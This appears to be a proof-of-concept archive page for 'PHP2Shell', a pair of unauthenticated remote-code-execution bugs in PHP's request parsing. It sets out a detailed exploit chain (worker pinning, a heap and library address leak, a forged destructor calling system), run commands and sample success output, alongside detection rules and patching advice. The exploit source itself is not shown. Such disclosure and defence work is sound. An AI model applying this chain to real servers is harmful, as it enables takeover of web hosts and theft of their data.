3.18.765.84 1.23 1.905 1.23 3.225.0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22.0 1.605-.015 2.895-.015 3.3.0.315.225.69.825.57A12.02 12.02.0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+intelseclab/poc-archive</a></div></div></div><details class="rounded-lg border border-zinc-200 lg:hidden dark:border-mono-border dark:bg-mono-card"><summary class="cursor-pointer select-none px-4 py-2 font-mono text-xs uppercase tracking-wide text-zinc-500 dark:text-mono-muted">On this page</summary><div class="toc border-t border-zinc-100 px-4 pb-3 text-sm leading-relaxed dark:border-mono-border"><nav id=TableOfContents><ul><li><a href=#metadata>Metadata</a></li><li><a href=#affected-target>Affected Target</a></li><li><a href=#summary>Summary</a></li><li><a href=#vulnerability-details>Vulnerability Details</a><ul><li><a href=#root-cause>Root Cause</a></li><li><a href=#attack-vector>Attack Vector</a></li><li><a href=#impact>Impact</a></li></ul></li><li><a href=#environment--lab-setup>Environment / Lab Setup</a><ul><li><a href=#setup-steps>Setup Steps</a></li></ul></li><li><a href=#proof-of-concept>Proof of Concept</a><ul><li><a href=#step-by-step-reproduction>Step-by-Step Reproduction</a></li><li><a href=#exploit-code>Exploit Code</a></li><li><a href=#expected-output>Expected Output</a></li></ul></li><li><a href=#detection--indicators-of-compromise>Detection & Indicators of Compromise</a></li><li><a href=#remediation>Remediation</a></li><li><a href=#references>References</a></li><li><a href=#notes>Notes</a></li></ul></nav></div></details><div class="rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><hr></div></div><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=metadata class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+Metadata</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class=overflow-x-auto><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Date Added</strong></td><td>2026-11-25</td></tr><tr><td><strong>Last Updated</strong></td><td>2026-10-24</td></tr><tr><td><strong>Author / Researcher</strong></td><td>9bie (PoC); PHP Security Team (advisory)</td></tr><tr><td><strong>CVE / Advisory</strong></td><td>CVE-2026-109618, CVE-2026-109619</td></tr><tr><td><strong>Category</strong></td><td>web</td></tr><tr><td><strong>Severity</strong></td><td>Critical</td></tr><tr><td><strong>CVSS Score</strong></td><td>9.8 (CVE-2026-109618), 9.2 (CVE-2026-109619)</td></tr><tr><td><strong>Status</strong></td><td>Weaponized</td></tr><tr><td><strong>Tags</strong></td><td>RCE, unauthenticated, PHP, memory-corruption, longjmp, OOM, stale-state, Apache, mod_php, PHP-FPM, heap-grooming, ASLR-bypass</td></tr><tr><td><strong>Related</strong></td><td>N/A</td></tr></tbody></table></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=affected-target class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
+Affected Target</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class=overflow-x-auto><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Software / System</strong></td><td>PHP (Apache <code>mod_php</code> and PHP-FPM SAPIs)</td></tr><tr><td><strong>Versions Affected</strong></td><td>PHP 7.3.0–8.2.35, 8.3.0–8.3.36, 8.4.0–8.4.27, 8.5.0–8.5.12 (NVD ranges)</td></tr><tr><td><strong>Language / Platform</strong></td><td>C; Linux x86_64 / aarch64; Apache prefork / PHP-FPM</td></tr><tr><td><strong>Authentication Required</strong></td><td>No</td></tr><tr><td><strong>Network Access Required</strong></td><td>Yes</td></tr></tbody></table></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=summary class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+Summary</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><p>PHP2Shell is a pair of PHP-core memory-corruption bugs that turn request parsing into unauthenticated remote code execution. When a request exhausts the PHP memory limit during multipart/upload parsing, PHP&rsquo;s longjmp-based OOM bailout can leave request memory uninitialized (CVE-2026-109618), and a related bug can leave global state pointing into freed request memory across requests on the same worker (CVE-2026-109619). The public PoC reaches RCE against the stock php:8.4.26-apache image with a 128M memory limit and display errors off, using only HTTP: it pins an Apache worker, leaks the heap and libphp bases through an oversized Set-Cookie OOB read, then forges a hash-table destructor that calls the zif system function.</p></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=vulnerability-details class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42.0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+Vulnerability Details</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><h3 id=root-cause>Root Cause</h3><p>PHP allocates request memory from the Zend memory manager and frees it at request shutdown. On an out-of-memory condition during request parsing, PHP uses <code>longjmp()</code> to abort the current context. Some parsing contexts do not account for this bailout and leave parts of request memory uninitialized before the next allocation; the cleanup path can then read or branch on that memory. A second bug leaves global state temporarily pointing into request memory and can preserve those stale pointers after the memory is freed, so a later request handled by the same worker can observe stale state. Both bugs are in the request-parsing / shutdown path, before any application script runs.</p><h3 id=attack-vector>Attack Vector</h3><p>An unauthenticated attacker sends crafted HTTP requests to any PHP endpoint — the PoC target page is only <code>&lt;?php echo "OK\n"; ?></code>. The chain uses chunked multipart bodies (no <code>Content-Length</code>) to bypass the <code>post_max_size</code> check, thousands of nested file fields and a <code>PHP_SESSION_UPLOAD_PROGRESS</code> part to force an OOM inside <code>php_url_encode()</code> during END cleanup, and a large <code>Set-Cookie</code> to read out of bounds and leak the chunk and <code>libphp</code> bases. A second OOM points the session state at a forged structure; a final request writes a fake <code>zend_array</code> whose <code>pDestructor</code> is <code>zif_system</code>, which is invoked during <code>zend_hash_destroy()</code>.</p><h3 id=impact>Impact</h3><p>Remote code execution as the PHP worker user (<code>www-data</code> in the reference lab). The PoC demonstrates command execution with <code>id</code> and supports arbitrary commands; a compromised web tier gives access to application secrets, databases, and any files readable by the web user.</p></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=environment-/-lab-setup class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+Environment / Lab Setup</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
+<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code>OS:          Linux x86_64 (Docker)
+Target:      php:8.4.26-apache (official image, official php.ini-production,
+             128M memory_limit, display_errors=Off, Apache prefork
+             MaxRequestWorkers=150)
+Attacker:    Python 3.10&#43; (stdlib only), same host or LAN
+Tools:       Docker, Python 3, curl</code></pre></div></div><h3 id=setup-steps>Setup Steps</h3><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Shell script</span>
+<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./pure/run_pure.sh
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python3 exploit.py --port <span class=m>18110</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python3 exploit.py --port <span class=m>18110</span> --restart p2s-pure-18110
+</span></span><span class=line><span class=cl>python3 exploit.py --port <span class=m>18110</span> --cmd <span class=s1>&#39;sh&lt;/out/c&#39;</span></span></span></code></pre></td></tr></table></div></div></div></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=proof-of-concept class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+Proof of Concept</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><h3 id=step-by-step-reproduction>Step-by-Step Reproduction</h3><ol><li><strong>Start the stock target</strong> — <code>./pure/run_pure.sh</code> starts <code>php:8.4.26-apache</code> with the official ini and prefork configuration; the target page is a one-line <code>&lt;?php echo "OK\n"; ?></code>.</li><li><strong>Pin one worker</strong> — with <code>MaxRequestWorkers=150</code>, the exploit holds 149 children with incomplete POST bodies so the four chain requests are served by the same child.</li><li><strong>A1 / B1</strong> — trigger the END-cleanup OOM, then leak the chunk base and <code>libphp</code> base through the oversized <code>Set-Cookie</code> OOB read (<code>zval_ptr_dtor</code> pointers in the leak window).</li><li><strong>A2 / B2</strong> — trigger the cheap OOM, write the fake reference and fake <code>zend_array</code>, and let <code>zend_hash_destroy()</code> call <code>system()</code> during request shutdown.</li><li><strong>Verify</strong> — the proof file contains <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>.</li></ol><h3 id=exploit-code>Exploit Code</h3><blockquote><p>See <a href=./exploit.py><code>exploit.py</code></a> and the chain primitives in <a href=https://github.com/9bie/php2shell-bypass-aslr-exp/tree/main/pure>pure/</a>. The upstream English write-up is in <a href=./upstream-readme-en.md><code>upstream-readme-en.md</code></a>.</p></blockquote><p>The chain shape is:</p><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
+<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>A1  END-cleanup send_cookie OOM
+</span></span><span class=line><span class=cl>B1  stale-id OOB read -&gt; chunk base + libphp base
+</span></span><span class=line><span class=cl>A2  cheap-OOM -&gt; dangling PS(http_session_vars)
+</span></span><span class=line><span class=cl>B2  fake reference + fake zend_array -&gt; pDestructor = zif_system</span></span></code></pre></td></tr></table></div></div></div></div><h3 id=expected-output>Expected Output</h3><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
+<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[try 1] A1: END-cleanup send_cookie OOM
+</span></span><span class=line><span class=cl>[try 1] B1: stale-id OOB read (chunk base + libphp)
+</span></span><span class=line><span class=cl>      arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -&gt; libphp=0x7fe00e8ff000
+</span></span><span class=line><span class=cl>[try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
+</span></span><span class=line><span class=cl>[4/4] RCE OK; proof .../out/p1:
+</span></span><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></code></pre></td></tr></table></div></div></div></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=detection-amp-indicators-of-compromise class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+Detection & Indicators of Compromise</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><ul><li>PHP / Apache logs showing <code>Allowed memory size of ... exhausted</code> during multipart parsing, followed by worker restarts or 500/502 responses.</li><li>Repeated chunked multipart requests larger than <code>post_max_size</code>, with very large header counts, nested file fields, or <code>PHP_SESSION_UPLOAD_PROGRESS</code> activity.</li><li><code>Set-Cookie</code> responses with unusually large encoded values, or anomalous <code>PHPSESSID</code> growth.</li><li>Worker crashes / segmentation faults in the PHP process, especially clustered with OOM entries.</li><li>The upstream response kit (<code>orbitron-ai/php2shell-response-kit</code>) provides Sigma, Splunk, QRadar, CrowdStrike, SentinelOne, Wazuh, YARA and ModSecurity content; treat it as detection guidance, not part of this PoC.</li></ul><p><strong>SIEM / IDS rule (example):</strong></p><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
+<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>alert http any any -&gt; any any (msg:&#34;PHP2Shell oversized multipart / OOM pattern&#34;; \
+</span></span><span class=line><span class=cl>  content:&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;; http_client_body; \
+</span></span><span class=line><span class=cl>  content:&#34;Content-Type|3a| multipart/form-data&#34;; http_header; sid:9002610;)</span></span></code></pre></td></tr></table></div></div></div></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=remediation class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 01-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 011-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17.0 011.52.0C14.51 3.81 17 5 19 5a1 1 0 011 1z"/><path d="m9 12 2 2 4-4"/></svg>
+Remediation</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><div class=overflow-x-auto><table><thead><tr><th>Action</th><th>Detail</th></tr></thead><tbody><tr><td><strong>Patch</strong></td><td>Upgrade to PHP 8.2.35, 8.3.36, 8.4.27 or 8.5.12 (or later) and restart every PHP worker; opcache/APCu alone does not replace the restart.</td></tr><tr><td><strong>Workaround</strong></td><td>The upstream advisory&rsquo;s mitigations reduce risk but do not fully fix: set <code>memory_limit = -1</code> with a cgroup/container memory limit, <code>post_max_size = 8M</code> (32M with uploads), <code>session.upload_progress.enabled = 0</code>, and <code>fatal_error_backtraces = 0</code> on PHP 8.5.</td></tr><tr><td><strong>Config Hardening</strong></td><td>Put a WAF/reverse proxy in front of PHP, cap request body size and header counts, isolate web workers, and monitor for OOM-driven worker restarts.</td></tr></tbody></table></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=references class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+References</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><ul><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2026-109618>CVE-2026-109618 — NVD</a></li><li><a href=https://nvd.nist.gov/vuln/detail/CVE-2026-109619>CVE-2026-109619 — NVD</a></li><li><a href=https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w>PHP advisory GHSA-w8hw-w9fx-j79w</a></li><li><a href=https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp>PHP advisory GHSA-6wmf-4rv5-p3rp</a></li><li><a href=https://arcticwolf.com/resources/blog/php2shell-critical-php-vulnerabilities-enable-unauthenticated-remote-code-execution/>Arctic Wolf — PHP2Shell write-up</a></li><li><a href=https://github.com/rapid7/metasploit-framework/pull/22139>Metasploit module PR #22139</a></li><li><a href=https://github.com/9bie/php2shell-bypass-aslr-exp>9bie/php2shell-bypass-aslr-exp — source PoC</a></li><li><a href=https://github.com/dinosn/php-cve-2026-10961x-lab-poc>dinosn/php-cve-2026-10961x-lab-poc — independent lab</a></li><li><a href=https://www.cisa.gov/known-exploited-vulnerabilities-catalog>CISA KEV catalogue</a></li></ul></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=notes class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15.5 3H5A2 2 0 003 5v14a2 2 0 002 2h14a2 2 0 002-2V8.5z"/><path d="M15 3v6h6"/></svg>
+Notes</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+prose-headings:font-mono prose-headings:tracking-tight
+prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+prose-code:before:content-[''] prose-code:after:content-['']
+prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><p>Auto-ingested from <a href=https://github.com/9bie/php2shell-bypass-aslr-exp>https://github.com/9bie/php2shell-bypass-aslr-exp</a> on 2026-11-25. The upstream repository has no explicit license file; the exploit files are archived with attribution for authorized research only. The <code>pure/</code> directory contains the chain primitives required by <code>exploit.py</code>; the upstream <code>archive/legacy-8m</code> tree and <code>logs/</code> were not copied.</p><p>Review of candidates: <code>9bie/php2shell-bypass-aslr-exp</code> is the selected full RCE PoC. <code>dinosn/php-cve-2026-10961x-lab-poc</code> is an independent self-contained lab and was kept as an alternate. <code>jf0x3f/php2shell-pocs</code> is a lab wrapper around the 9bie PoC. <code>AmpedWasTaken/PHP2Shell-CVE-2026-109618-CVE-2026-109619</code> is a defensive fleet audit (explicitly does not exploit) and <code>orbitron-ai/php2shell-response-kit</code> is a detection/response kit; both were excluded as detectors.</p><p>The PoC was verified against the stock official image in the upstream lab (10/10 on the 150-worker configuration, 20/20 single-worker). It requires the target to be reachable and the Apache prefork worker count to be known or default; the chain is ASLR-dependent and re-leaks/retries on failure. Run only against systems you own or have written authorization to test.</p></div></section><div class="overflow-hidden rounded-lg border border-zinc-300 shadow-lg dark:border-mono-border"><div class="flex items-center gap-3 bg-zinc-800 px-3 py-2"><div class="flex shrink-0 items-center gap-1.5"><span class="h-3 w-3 rounded-full bg-red-500"></span>
+<span class="h-3 w-3 rounded-full bg-yellow-400"></span>
+<span class="h-3 w-3 rounded-full bg-green-500"></span></div><div class="flex flex-1 justify-center"><div class="flex items-center gap-1.5 rounded-t border-x border-t border-zinc-700 bg-zinc-950 px-3 py-1"><span class="h-2.5 w-2.5 shrink-0 rounded-sm" style=background-color:#3b82f6></span>
+<span class="font-mono text-xs text-zinc-200">exploit.py</span></div></div><div class="flex shrink-0 items-center gap-2"><span class="rounded border border-zinc-600 bg-zinc-700/40 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wide text-zinc-400">python</span>
+<a href=https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/exploit.py target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">raw</a>
+<a href=https://github.com/intelseclab/poc-archive/blob/master/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/exploit.py target=_blank rel=noopener class="font-mono text-xs text-zinc-400 hover:text-zinc-200 transition">GitHub</a>
+<a href=https://raw.githubusercontent.com/intelseclab/poc-archive/master/pocs/web/2026-11-25_php2shell-php-core-preauth-rce/exploit.py download=exploit.py class="rounded bg-emerald-600 px-2.5 py-1 font-mono text-xs font-medium text-white transition hover:bg-emerald-500">↓ Download</a></div></div><div class="poc-viewer overflow-x-auto"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
